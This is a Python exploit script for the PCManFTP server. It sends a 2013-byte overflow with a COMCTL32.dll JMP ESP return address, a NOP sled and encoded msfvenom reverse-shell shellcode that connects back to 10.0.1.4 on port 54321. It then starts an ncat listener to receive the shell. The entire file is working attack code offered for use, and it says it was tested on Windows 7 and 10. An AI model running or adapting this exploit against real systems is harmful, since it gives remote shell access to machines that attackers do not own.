#!/usr/bin/python
# PCManFTP
# Using COMCTL32.dll
# Praise be to the shell!
# Based on ch3rn0byl's exploit
# Tested on Windows 7 and Windows 10
import socket
from sys import argv
from subprocess import call
from time import sleep
if len(argv) != 3:
	print "Usage: evilSocket.py [ip] [port]"
	exit(0)
HOST = argv[1]
PORT = argv[2]
# COMCTL32.DLL JMP ESP
RETURN_ADDR = "\xdf\x6e\x88\x72"
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.4 LPORT=54321 -f python -e x86/shikata_ga_nai -a x86 --platform Windows -b "\x00\x0a\x0d" -v shellcode
shellcode =  ""
shellcode += "\xba\x6f\xf9\xa0\x8e\xdd\xc0\xd9\x74\x24\xf4\x5b"
shellcode += "\x31\xc9\xb1\x52\x31\x53\x12\x83\xeb\xfc\x03\x3c"
shellcode += "\xf7\x42\x7b\x3e\xef\x01\x84\xbe\xf0\x65\x0c\x5b"
shellcode += "\xc1\xa5\x6a\x28\x72\x16\xf8\x7c\x7f\xdd\xac\x94"
shellcode += "\xf4\x93\x78\x9b\xbd\x1e\x5f\x92\x3e\x32\xa3\xb5"
shellcode += "\xbc\x49\xf0\x15\xfc\x81\x05\x54\x39\xff\xe4\x04"
shellcode += "\x92\x8b\x5b\xb8\x97\xc6\x67\x33\xeb\xc7\xef\xa0"
shellcode += "\xbc\xe6\xde\x77\xb6\xb0\xc0\x76\x1b\xc9\x48\x60"
shellcode += "\x78\xf4\x03\x1b\x4a\x82\x95\xcd\x82\x6b\x39\x30"
shellcode += "\x2b\x9e\x43\x75\x8c\x41\x36\x8f\xee\xfc\x41\x54"
shellcode += "\x8c\xda\xc4\x4e\x36\xa8\x7f\xaa\xc6\x7d\x19\x39"
shellcode += "\xc4\xca\x6d\x65\xc9\xcd\xa2\x1e\xf5\x46\x45\xf0"
shellcode += "\x7f\x1c\x62\xd4\x24\xc6\x0b\x4d\x81\xa9\x34\x8d"
shellcode += "\x6a\x15\x91\xc6\x87\x42\xa8\x85\xcf\xa7\x81\x35"
shellcode += "\x10\xa0\x92\x46\x22\x6f\x09\xc0\x0e\xf8\x97\x17"
shellcode += "\x70\xd3\x60\x87\x8f\xdc\x90\x8e\x4b\x88\xc0\xb8"
shellcode += "\x7a\xb1\x8a\x38\x82\x64\x1c\x68\x2c\xd7\xdd\xd8"
shellcode += "\x8c\x87\xb5\x32\x03\xf7\xa6\x3d\xc9\x90\x4d\xc4"
shellcode += "\x9a\x94\x91\xc7\x53\xc1\x93\xc7\xb7\x20\x1d\x21"
shellcode += "\x5d\x53\x4b\xfa\xca\xca\xd6\x70\x6a\x12\xcd\xfd"
shellcode += "\xac\x98\xe2\x02\x62\x69\x8e\x10\x13\x99\xc5\x4a"
shellcode += "\xb2\xa6\xf3\xe2\x58\x34\x98\xf2\x17\x25\x37\xa5"
shellcode += "\x70\x9b\x4e\x23\x6d\x82\xf8\x51\x6c\x52\xc2\xd1"
shellcode += "\xab\xa7\xcd\xd8\x3e\x93\xe9\xca\x86\x1c\xb6\xbe"
shellcode += "\x56\x4b\x60\x68\x11\x25\xc2\xc2\xcb\x9a\x8c\x82"
shellcode += "\x8a\xd0\x0e\xd4\x92\x3c\xf9\x38\x22\xe9\xbc\x47"
shellcode += "\x8b\x7d\x49\x30\xf1\x1d\xb6\xeb\xb1\x2e\xfd\xb1"
shellcode += "\x90\xa6\x58\x20\xa1\xaa\x5a\x9f\xe6\xd2\xd8\x15"
shellcode += "\x97\x20\xc0\x5c\x92\x6d\x46\x8d\xee\xfe\x23\xb1"
shellcode += "\x5d\xfe\x61"
# I wasn't able to use the jmp address suggested
# as it contained null characters in windows 10
# but I found one in memory that would do fine
# fine just fine
PAYLOAD = "A" * 2013 +  RETURN_ADDR + "\x90" * 15 + shellcode
# the offset was actually 2008 but I had to stetch it to 2013
try:
	print "[*] Connecting to {}...".format(HOST)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, int(PORT)))
	BANNER = s.recv(1024)
	print "[x] Connected to {}".format(BANNER)
	print "[*] Sending payload..."
	s.send(PAYLOAD)
	s.close()
	print "[x] Payload delivered" 
	print "[*] Waiting for target to connect...\n"
	try:
		sleep(1)
		call(["ncat", "-vlnp", "54321"])
	except:
		print "[!] Couldn't setup listening instance"
except:
	print "[!] Connection failed"
